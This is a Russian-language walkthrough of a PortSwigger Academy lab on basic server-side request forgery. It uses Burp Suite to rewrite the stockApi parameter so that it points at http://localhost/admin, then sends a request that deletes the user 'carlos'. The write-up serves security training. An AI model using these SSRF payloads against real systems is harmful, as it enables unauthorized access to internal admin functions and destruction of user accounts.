Перейдем по популярной директории `/admin` на данном уязвимом ресурсе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/1.%20Basic%20SSRF%20against%20the%20local%20server/pics%20for%20walktrough/1.png)

Видим, что у нас недостаточно прав для просмотра данной страницы.
Далее перейдем на случайный товар, и посмотрим его количество на складе, нажав на `Check stock`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/1.%20Basic%20SSRF%20against%20the%20local%20server/pics%20for%20walktrough/2.png)
Далее перейдем в `Proxy` -> `HTTP histoty` и найдем запрос `POST /product/stock` с параметром `stockApi`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/1.%20Basic%20SSRF%20against%20the%20local%20server/pics%20for%20walktrough/3.png)

Структура ресурса построена так, что на клиентской стороне формируется запрос к бэку, который мы можем изменить.
Изменим параметр `stockApi`, чтобы он отправлял нас на админскую панель
```
POST /product/stock
...
stockApi=http://localhost/admin
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/1.%20Basic%20SSRF%20against%20the%20local%20server/pics%20for%20walktrough/4.png)
Получив доступ к админской панели, удалим пользователя `carlos`, согласно заданию
```
POST /product/stock
...
stockApi=http://localhost/admin/delete?username=carlos
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/1.%20Basic%20SSRF%20against%20the%20local%20server/pics%20for%20walktrough/5.png)
Нажав `Follow redirection` получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/1.%20Basic%20SSRF%20against%20the%20local%20server/pics%20for%20walktrough/6.png)
